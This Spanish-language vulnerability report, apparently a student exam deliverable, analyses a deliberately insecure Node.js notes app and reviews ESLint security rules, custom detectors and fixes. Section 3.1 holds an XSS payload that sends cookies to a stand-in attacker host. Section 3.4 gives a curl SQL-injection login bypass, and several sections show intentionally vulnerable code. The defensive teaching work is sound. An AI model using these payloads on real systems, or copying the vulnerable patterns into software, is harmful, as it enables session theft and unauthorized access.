# INFORME DE ANÁLISIS DE VULNERABILIDADES DE SEGURIDAD
## Aplicación "Mis Notas Personales"

---

# 1. INFRAESTRUCTURA Y AMBIENTE DE PRUEBAS

## 1.1 Ambiente de Desarrollo
| Componente | Especificación |
|------------|----------------|
| Sistema Operativo | Windows (PowerShell 5.1) |
| Node.js | v22.16.0 |
| Gestor de paquetes | npm |
| Directorio de trabajo | C:\Users\crgar\Documents\ssf\parcial |
| Puerto del servidor | 3000 |

## 1.2 Arquitectura de la Aplicación
```
┌─────────────────────────────────────────────────────────────┐
│                      FRONTEND                                │
│  ┌──────────┐  ┌──────────┐  ┌──────────────┐              │
│  │ index.html│  │register  │  │  dashboard   │              │
│  │  (Login)  │  │ .html    │  │   .html      │              │
│  └────┬─────┘  └────┬─────┘  └──────┬───────┘              │
│       └─────────────┼───────────────┘                       │
│              ┌──────▼──────┐                                │
│              │   app.js     │  ← Vulnerabilidades aquí       │
│              │ (418 líneas) │                                │
│              └─────────────┘                                │
└─────────────────────────┬───────────────────────────────────┘
                           │ HTTP/REST
┌─────────────────────────▼───────────────────────────────────┐
│                      BACKEND                                 │
│  ┌────────────────────────────────────────────────────┐     │
│  │              Express.js Server (server.js)          │     │
│  └────────────────────────────────────────────────────┘     │
│       │                          │                           │
│  ┌────▼────┐               ┌────▼──────┐                   │
│  │  auth   │               │   notes   │                   │
│  │ routes  │               │  routes   │                   │
│  │  (.js)  │               │   (.js)   │                   │
│  └────┬────┘               └─────┬─────┘                   │
│       │                          │                          │
│  ┌────▼──────────────────────────▼────┐                   │
│  │        SQLite Database (notas.db)   │                   │
│  └────────────────────────────────────┘                   │
└─────────────────────────────────────────────────────────────┘
```

## 1.3 Stack Tecnológico
| Capa | Tecnología | Versión |
|------|------------|---------|
| Runtime | Node.js | 22.16.0 |
| Backend Framework | Express.js | ^4.18.2 |
| Base de Datos | SQLite (sql.js) | ^1.10.3 |
| Autenticación | bcryptjs + jsonwebtoken | ^2.4.3, ^9.0.2 |
| Frontend | HTML5 + CSS3 + JavaScript ES6 | - |
| Linting Seguridad | ESLint + eslint-plugin-security + reglas custom | ^8.57.0, ^1.7.1 |

## 1.4 Estructura de Archivos con Líneas de Código
```
parcial/
├── backend/
│   ├── server.js              # 47 líneas
│   ├── database.js            # 61 líneas
│   ├── notas.db               # SQLite (generado)
│   └── routes/
│       ├── auth.js            # 117 líneas ← SQL Injection
│       └── notes.js           # 151 líneas
├── frontend/
│   ├── index.html             # Login
│   ├── register.html          # Registro
│   ├── dashboard.html         # Panel principal
│   ├── css/
│   │   └── style.css          # Estilos
│   └── js/
│       └── app.js             # 418 líneas ← XSS, eval, setTimeout, Prototype Pollution
├── package.json
├── eslint.config.js           # Configuración + reglas custom de seguridad
└── INFORME_VULNERABILIDADES.md
```

---

# 2. METODOLOGÍA DE ANÁLISIS

## 2.1 Herramientas Utilizadas
1. **ESLint v8.57.0** con **eslint-plugin-security v1.7.1**
2. **Reglas custom** desarrolladas para detectar vulnerabilidades no cubiertas por el plugin
3. Inspección manual de código fuente
4. Pruebas funcionales de endpoints API

## 2.2 Reglas Custom Desarrolladas

Se implementaron 3 reglas custom en `eslint.config.js` para detectar vulnerabilidades que el plugin de seguridad no cubre:

### no-innerhtml
Detecta uso de `innerHTML` con datos que no son literales estáticos, indicando potencial XSS.

### no-settimeout-string
Detecta `setTimeout`/`setInterval` con argumentos de tipo string, lo cual es equivalente a `eval()`.

### no-prototype-pollution
Detecta uso de `Object.assign()` con objetos que podrían contener keys peligrosas (`__proto__`, `constructor`, `prototype`).

## 2.3 Comandos de Análisis
```bash
# Verificar versiones
node --version
npm --version

# Ver estructura del proyecto
dir /s /b

# Instalar dependencias
npm install

# Ejecutar análisis de vulnerabilidades
npm run lint

# Ver solo errores
npm run lint 2>&1 | findstr "error"

# Ver solo warnings
npm run lint 2>&1 | findstr "warning"
```

---

# 3. VULNERABILIDADES IDENTIFICADAS

---

## 3.1 VULNERABILIDAD 1: Cross-Site Scripting (XSS) via innerHTML

### Descripción
Durante el análisis de la aplicación se identificó una vulnerabilidad de tipo Cross-Site Scripting (XSS) en la función que renderiza las notas del usuario. Esta vulnerabilidad ocurre cuando datos controlados por el usuario son insertados en el DOM utilizando `innerHTML` sin aplicar validación o sanitización previa.

### Código Vulnerable
**Ubicación**: `frontend/js/app.js:203-206`

```javascript
function renderNotes(notes) {
  const notesList = document.getElementById('notesList');
  // ... construcción de HTML con datos del usuario ...
  notesList.innerHTML = html;  // ⚠️ XSS: datos sin sanitizar
}
```

### Análisis Técnico
El método `innerHTML` interpreta el contenido recibido como código HTML. Si un atacante logra almacenar contenido malicioso dentro de los campos `title` o `content`, dicho contenido será ejecutado por el navegador cuando otro usuario visualice la información.

### Clasificación OWASP
OWASP Top 10 2021: **A03:2021 – Injection**

### Impacto
- Robo de cookies de sesión mediante `document.cookie`
- Ejecución de código JavaScript arbitrario en el navegador de la víctima
- Suplantación de identidad de usuarios (session hijacking)
- Redirección a sitios maliciosos

### Evidencia
La vulnerabilidad se encuentra en la función `renderNotes()` en `frontend/js/app.js:175` y `frontend/js/app.js:206`.

### Ejemplo de Entrada Maliciosa
```
Título: <img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
```

### Detección ESLint
```
frontend\js\app.js
  175:7   error    Potential XSS: innerHTML with user-controlled data detected    custom/no-innerhtml
  206:5   error    Potential XSS: innerHTML with user-controlled data detected    custom/no-innerhtml
```

### Corrección
```javascript
// Usar textContent o DOMPurify en lugar de innerHTML
const title = document.createElement('h3');
title.textContent = note.title; // Inserta como texto plano, no HTML
```

---

## 3.2 VULNERABILIDAD 2: Code Injection via eval()

### Descripción
Durante el análisis de la aplicación se identificaron múltiples vulnerabilidades de tipo Code Injection causadas por el uso de `eval()` para procesar datos del usuario. La función `eval()` ejecuta código JavaScript arbitrario pasado como string.

### Código Vulnerable

**Ubicación 1**: `frontend/js/app.js:375-386`
```javascript
window.evaluateNoteExpression = function(expression) {
  const result = eval(expression);  // ⚠️ eval con input del usuario
  return result;
};
```

**Ubicación 2**: `frontend/js/app.js:407-417`
```javascript
window.advancedSearch = function(searchExpr) {
  return notes.filter(note => eval(searchExpr));  // ⚠️ eval en filter
};
```

### Análisis Técnico
`eval()` toma un string y lo ejecuta como código JavaScript. Cuando datos controlados por el usuario llegan a `eval()`, un atacante puede ejecutar código arbitrario.

### Clasificación OWASP
OWASP Top 10 2021: **A03:2021 – Injection**

### Impacto
- Ejecución de código JavaScript arbitrario en el navegador
- Acceso completo al objeto `window` y todas las APIs del navegador
- Robo de datos del DOM, localStorage, sessionStorage

### Evidencia
- `frontend/js/app.js:381` - evaluateNoteExpression
- `frontend/js/app.js:414` - advancedSearch

### Detección ESLint
```
frontend\js\app.js
  381:20  error    eval with argument of type Identifier    security/detect-eval-with-expression
  414:33  error    eval with argument of type Identifier    security/detect-eval-with-expression
```

### Corrección
```javascript
// Para evaluateNoteExpression - validar como expresión matemática:
window.evaluateNoteExpression = function(expression) {
  if (!/^[\d\s+\-*/().]+$/.test(expression)) {
    return 'Expresión no permitida';
  }
  // Usar validación estricta en lugar de eval
};

// Para advancedSearch - usar métodos seguros:
window.advancedSearch = function(searchTerm) {
  return notes.filter(note => 
    note.title.toLowerCase().includes(searchTerm.toLowerCase())
  );
};
```

---

## 3.3 VULNERABILIDAD 3: Code Injection via setTimeout(string)

### Descripción
Durante el análisis de la aplicación se identificaron vulnerabilidades causadas por el uso de `setTimeout()` con strings como primer argumento. Esta práctica es equivalente a usar `eval()`.

### Código Vulnerable

**Ubicación 1**: `frontend/js/app.js:258-267`
```javascript
let reminderCount = 0;
setTimeout(`
  reminderCount++;
  console.log('Recordatorio #' + reminderCount);
`, 5000);  // ⚠️ String en setTimeout
```

**Ubicación 2**: `frontend/js/app.js:346-353`
```javascript
searchInput.addEventListener('input', (e) => {
  const searchValue = currentSearch;
  setTimeout(`
    console.log('Búsqueda: ${searchValue}');
  `, 300);  // ⚠️ Template literal en setTimeout
});
```

### Análisis Técnico
Cuando `setTimeout()` recibe un string como primer argumento, JavaScript lo evalúa usando el motor de JavaScript, comportamiento idéntico a `eval()`.

### Clasificación OWASP
OWASP Top 10 2021: **A03:2021 – Injection**

### Impacto
- Ejecución de código JavaScript arbitrario
- Equivalente a `eval()` - mismo nivel de severidad

### Evidencia
- `frontend/js/app.js:262` - Recordatorio automático
- `frontend/js/app.js:350` - Búsqueda con delay

### Detección ESLint
```
frontend\js\app.js
  262:14  error    Code Injection: setTimeout/setInterval with string argument    custom/no-settimeout-string
  350:16  error    Code Injection: setTimeout/setInterval with string argument    custom/no-settimeout-string
```

### Corrección
```javascript
// Usar función flecha en lugar de string
setTimeout(() => {
  reminderCount++;
  console.log(`Recordatorio #${reminderCount}`);
}, 5000);

searchInput.addEventListener('input', () => {
  const searchValue = currentSearch;
  setTimeout(() => {
    console.log('Búsqueda:', searchValue);
  }, 300);
});
```

---

## 3.4 VULNERABILIDAD 4: SQL Injection (Uso Inseguro de Inputs)

### Descripción
Durante el análisis de la aplicación se identificó una vulnerabilidad de tipo SQL Injection en el proceso de autenticación. Esta vulnerabilidad ocurre cuando datos controlados por el usuario son concatenados directamente en una consulta SQL sin usar parámetros preparados.

### Código Vulnerable
**Ubicación**: `backend/routes/auth.js:53-60`
```javascript
router.post('/login', (req, res) => {
  const { username, password } = req.body;
  // ...
  const query = `SELECT * FROM users WHERE username = '${username}'`;  // ⚠️ SQL Injection
  const result = db.exec(query);
});
```

### Análisis Técnico
La concatenación de strings en la query SQL permite que un atacante modifique la lógica de la consulta.

### Clasificación OWASP
OWASP Top 10 2021: **A03:2021 – Injection**

### Impacto
- Bypass de autenticación (login sin contraseña válida)
- Acceso no autorizado a cuentas de usuarios
- Exposición de datos sensibles

### Evidencia
La vulnerabilidad está activa en `backend/routes/auth.js:55`.

### Prueba de Concepto
```bash
# Login con SQL Injection
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\" OR '1'='1","password":"cualquiera"}'
```

### Detección ESLint
❌ **NO DETECTADO** - El plugin security no tiene regla para SQL Injection.

### Corrección
```javascript
// Usar parámetros preparados
const query = `SELECT * FROM users WHERE username = ?`;
const result = db.exec(query, [username]);
```

---

## 3.5 VULNERABILIDAD 5: Prototype Pollution

### Descripción
Durante el análisis de la aplicación se identificaron múltiples vulnerabilidades de tipo Prototype Pollution causadas por el uso de `Object.assign()` sin validar las claves (keys) del objeto merging.

### Código Vulnerable

**Ubicación 1**: `frontend/js/app.js:305-311`
```javascript
const noteData = Object.assign(
  { created_at: new Date().toISOString() },
  { title, category, content }  // ⚠️ Posible __proto__ pollution
);
```

**Ubicación 2**: `frontend/js/app.js:398-405`
```javascript
window.updateUserConfig = function(newConfig) {
  const updatedConfig = Object.assign(currentConfig, newConfig);  // ⚠️ Pollution
};
```

**Ubicación 3**: `frontend/js/app.js:390-393`
```javascript
window.importNotes = function(notesArray) {
  const mergedNotes = Object.assign([], notesArray);  // ⚠️ Pollution
};
```

### Análisis Técnico
Prototype Pollution ocurre cuando un atacante puede modificar el prototype de `Object`, afectando a todos los objetos de la aplicación.

### Clasificación OWASP
OWASP Top 10 2021: **A03:2021 – Injection**

### Impacto
- Modificación del prototype de Object
- Creación de propiedades arbitrarias en cualquier objeto
- Posible bypass de validaciones de seguridad

### Evidencia
- `frontend/js/app.js:308` - noteData en noteForm
- `frontend/js/app.js:391` - importNotes
- `frontend/js/app.js:402` - updateUserConfig

### Detección ESLint
```
frontend\js\app.js
  308:24  error    Prototype Pollution: Object.assign with potentially unsafe keys    custom/no-prototype-pollution
  391:23  error    Prototype Pollution: Object.assign with potentially unsafe keys    custom/no-prototype-pollution
  402:25  error    Prototype Pollution: Object.assign with potentially unsafe keys    custom/no-prototype-pollution
```

### Corrección
```javascript
function sanitizeObject(obj) {
  const forbiddenKeys = ['__proto__', 'constructor', 'prototype'];
  const sanitized = {};
  for (const key of Object.keys(obj)) {
    if (!forbiddenKeys.includes(key)) {
      sanitized[key] = obj[key];
    }
  }
  return sanitized;
}

const noteData = Object.assign(
  { created_at: new Date().toISOString() },
  sanitizeObject({ title, category, content })
);
```

---

# 4. RESULTADOS DEL ANÁLISIS CON ESLINT

## 4.1 Salida Completa de ESLint

```
C:\Users\crgar\Documents\ssf\parcial\backend\routes\auth.js
  66:9   warning  Generic Object Injection Sink                       security/detect-object-injection
  66:21  warning  Generic Object Injection Sink                       security/detect-object-injection

C:\Users\crgar\Documents\ssf\parcial\backend\routes\notes.js
  30:7   warning  Generic Object Injection Sink                       security/detect-object-injection
  30:18  warning  Generic Object Injection Sink                       security/detect-object-injection

C:\Users\crgar\Documents\ssf\parcial\frontend\js\app.js
   85:5   warning  Potential timing attack, left side: true           security/detect-possible-timing-attacks
  172:12  warning  Generic Object Injection Sink                      security/detect-object-injection
  175:7   error    Potential XSS: innerHTML with user-controlled data  custom/no-innerhtml
  206:5   error    Potential XSS: innerHTML with user-controlled data  custom/no-innerhtml
  261:7   warning  'reminderCount' is assigned a value but never used  no-unused-vars
  262:14  error    Code Injection: setTimeout with string argument     custom/no-settimeout-string
  308:24  error    Prototype Pollution: Object.assign unsafe keys     custom/no-prototype-pollution
  350:16  error    Code Injection: setTimeout with string argument     custom/no-settimeout-string
  381:20  error    eval with argument of type Identifier               security/detect-eval-with-expression
  391:23  error    Prototype Pollution: Object.assign unsafe keys     custom/no-prototype-pollution
  402:25  error    Prototype Pollution: Object.assign unsafe keys     custom/no-prototype-pollution
  414:25  warning  'note' is defined but never used                    no-unused-vars
  414:33  error    eval with argument of type Identifier               security/detect-eval-with-expression

✖ 17 problems (9 errors, 8 warnings)
```

## 4.2 Resumen de Problemas Detectados

| Tipo | Cantidad |
|------|----------|
| Errors | 9 |
| Warnings | 8 |
| **Total** | **17** |

## 4.3 Tabla Resumen de Detección

| Vulnerabilidad | Código Vulnerable | ESLint Detectó | Regla Usada |
|---------------|-------------------|----------------|-------------|
| XSS (innerHTML) #1 | `app.js:175` | ✅ Sí | custom/no-innerhtml |
| XSS (innerHTML) #2 | `app.js:206` | ✅ Sí | custom/no-innerhtml |
| eval() #1 | `app.js:381` | ✅ Sí | security/detect-eval-with-expression |
| eval() #2 | `app.js:414` | ✅ Sí | security/detect-eval-with-expression |
| setTimeout(string) #1 | `app.js:262` | ✅ Sí | custom/no-settimeout-string |
| setTimeout(string) #2 | `app.js:350` | ✅ Sí | custom/no-settimeout-string |
| SQL Injection | `auth.js:55` | ❌ No | - |
| Prototype Pollution #1 | `app.js:308` | ✅ Sí | custom/no-prototype-pollution |
| Prototype Pollution #2 | `app.js:391` | ✅ Sí | custom/no-prototype-pollution |
| Prototype Pollution #3 | `app.js:402` | ✅ Sí | custom/no-prototype-pollution |

---

# 5. ANÁLISIS CRÍTICO: FORTALEZAS Y LIMITACIONES

## 5.1 Fortalezas de ESLint Security

1. **Detección de eval()**: El plugin detecta correctamente uso de `eval()` con expresiones dinámicas.

2. **Reglas custom efectivas**: Las reglas desarrolladas (`no-innerhtml`, `no-settimeout-string`, `no-prototype-pollution`) permiten detectar vulnerabilidades que el plugin base no cubre.

3. **Integración sencilla**: Fácil de integrar en proyectos Node.js con npm.

4. **CI/CD friendly**: Puede integrarse en pipelines de integración continua.

5. **Detección de patrones conocidos**: Identifica rápidamente usos de `eval()` y Object injection sinks.

## 5.2 Limitaciones de ESLint Security

1. **No detecta SQL Injection**: La concatenación de strings en queries SQL no es detectada por este plugin. Se necesita análisis manual o herramientas especializadas como sqlmap.

2. **No detecta Hardcoded Secrets**: El plugin no tiene reglas para detectar credenciales hardcodeadas como passwords o API keys en el código.

3. **Análisis estático limitado**: No puede detectar vulnerabilidades que solo se manifiestan en tiempo de ejecución.

4. **Falsos positivos**: Genera warnings en código legítimo que usa acceso dinámico a propiedades (ej: acceso a columnas de BD).

5. **No analiza flujo de datos**: No puede determinar si una entrada es de fuente confiable o no.

6. **Análisis superficial**: Solo busca patrones, no el contexto de uso.

## 5.3 Falsos Positivos Identificados

| Ubicación | Alerta | Justificación |
|-----------|--------|----------------|
| `app.js:85` | Potential timing attack | La comparación `password !== confirmPassword` usa bcrypt.compareSync que ya es seguro |
| `auth.js:66` | Generic Object Injection Sink | Acceso a columnas de base de datos, fuente confiable |
| `notes.js:30` | Generic Object Injection Sink | Acceso a columnas de base de datos, fuente confiable |
| `app.js:172` | Generic Object Injection Sink | Acceso a columnas de base de datos, fuente confiable |

---

# 6. COMPARATIVA: DETECTADO vs NO DETECTADO

## 6.1 Lo que ESLint SÍ Detectó (Con Reglas Custom)

| Vulnerabilidad | Línea | Severidad |
|---------------|-------|-----------|
| XSS via innerHTML | app.js:175 | Error |
| XSS via innerHTML | app.js:206 | Error |
| eval() | app.js:381 | Error |
| eval() | app.js:414 | Error |
| setTimeout(string) | app.js:262 | Error |
| setTimeout(string) | app.js:350 | Error |
| Prototype Pollution | app.js:308 | Error |
| Prototype Pollution | app.js:391 | Error |
| Prototype Pollution | app.js:402 | Error |

**Total: 9 errores**

## 6.2 Lo que ESLint NO Detectó

| Vulnerabilidad | Ubicación | Severidad Real |
|----------------|-----------|----------------|
| SQL Injection | auth.js:55 | Crítica |
| Hardcoded Secrets | auth.js:7 (JWT_SECRET) | Alta |

**Total: 2 vulnerabilidades NO detectadas**

---

# 7. COMANDOS PARA VIDEO

## 7.1 Instalación del Proyecto
```bash
# Verificar versiones
node --version
npm --version

# Entrar al directorio
cd C:\Users\crgar\Documents\ssf\parcial

# Instalar dependencias
npm install

# Ver estructura
dir
```

## 7.2 Comandos de Análisis
```bash
# Ejecutar ESLint completo
npm run lint

# Ver solo errores
npm run lint 2>&1 | findstr "error"

# Ver solo warnings
npm run lint 2>&1 | findstr "warning"

# Buscar SQL Injection manualmente
Select-String -Path "backend\**\*.js" -Pattern "'.*'.*\+" -Recurse

# Ver archivo de configuración
type eslint.config.js
```

## 7.3 Ver Código Vulnerable
```bash
# Ver SQL Injection en auth.js
type backend\routes\auth.js | findstr /n "55"

# Ver XSS en app.js
type frontend\js\app.js | findstr /n "175 206"

# Ver Hardcoded Secret
type backend\routes\auth.js | findstr /n "7"
```

---

# 8. CONCLUSIONES

Se identificaron y documentaron **5 vulnerabilidades críticas** en la aplicación:

1. **XSS via innerHTML** - Permite ejecución de código JavaScript arbitrario
2. **eval()** - Permite ejecución de código arbitrario en el frontend
3. **setTimeout(string)** - Equivalente a eval(), permite inyección de código
4. **SQL Injection** - Permite bypass de autenticación y acceso no autorizado a datos
5. **Prototype Pollution** - Permite modificar el prototype de Object

**Con las reglas custom implementadas, ESLint detectó 9 errores** (anteriormente solo 2).

**Limitaciones detectadas:**
- SQL Injection sigue sin ser detectada
- Hardcoded Secrets no son detectados
- Se requieren herramientas complementarias (SAST/DAST, revisión manual, penetration testing)

**ESLint es una herramienta útil pero insuficiente** para un análisis de seguridad completo. Debe complementarse con otras herramientas y revisiones manuales.

---

**Nota**: Esta aplicación es únicamente para fines educativos. No debe ser utilizada en entornos de producción.